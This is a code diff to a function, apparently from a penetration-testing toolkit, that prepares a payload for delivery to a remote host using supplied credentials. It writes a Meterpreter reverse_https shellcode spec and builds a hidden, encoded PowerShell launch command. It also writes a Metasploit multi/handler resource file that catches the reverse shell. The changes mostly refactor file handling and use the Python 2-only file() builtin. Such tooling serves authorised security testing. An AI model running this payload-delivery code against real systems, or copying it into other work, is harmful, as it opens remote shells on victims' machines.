@@ -239,38 +239,48 @@ def deploy_hex2binary(ipaddr, port, username, password):
         core.update_options("POWERSHELL_SOLO=ON")
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
-        with open(os.path.join(core.setdir + "/payload_options.shellcode"), "w") as filewrite:
-            # format needed for shellcode generation
-            filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
+        #with open(os.path.join(core.setdir + "/payload_options.shellcode"), "w") as filewrite:
+        # format needed for shellcode generation
+        filewrite = file(core.setdir + "/payload_options.shellcode", "w")
+        filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
+        filewrite.close()
 
-        try:
-            core.module_reload(src.payloads.powershell.prep)
-        except:
-            import src.payloads.powershell.prep
+        #try:
+        #    core.module_reload(src.payloads.powershell.prep)
+        #except:
+        #    import src.payloads.powershell.prep
+
+        # launch powershell
+        prep_powershell_payload()
 
         # create the directory if it does not exist
         if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
             os.makedirs(os.path.join(core.setdir + "reports/powershell"))
 
-        with open(os.path.join(core.setdir + "x86.powershell")) as x86:
-            x86 = x86.read()
+        #with open(os.path.join(core.setdir + "x86.powershell")) as x86:
+        x86 = file(core.setdir + "x86.powershell").read()
+        #    x86 = x86.read()
 
         x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
         core.print_status("If you want the powershell commands and attack, "
                           "they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
-        with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt"), "w") as filewrite:
-            filewrite.write(x86)
+        filewrite = open(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
+        filewrite.write(x86)
+        filewrite.close()
 
         # if our payload is x86 based - need to prep msfconsole rc
         if payload == "x86":
             powershell_command = x86
             # powershell_dir = core.setdir + "/reports/powershell/x86_powershell_injection.txt"
-            with open(os.path.join(core.setdir + "reports/powershell/powershell.rc"), "w") as filewrite:
-                filewrite.write("use multi/handler\n"
+            #with open(os.path.join(core.setdir + "reports/powershell/powershell.rc"), "w") as filewrite:
+            filewrite = open(core.setdir + "reports/powershell/powershell.rc", "w")
+            filewrite.write("use multi/handler\n"
                                 "set payload windows/meterpreter/reverse_https\n"
                                 "set lport {0}\n"
                                 "set LHOST 0.0.0.0\n"
                                 "exploit -j".format(port))
+            filewrite.close()
+
         else:
             powershell_command = None
 
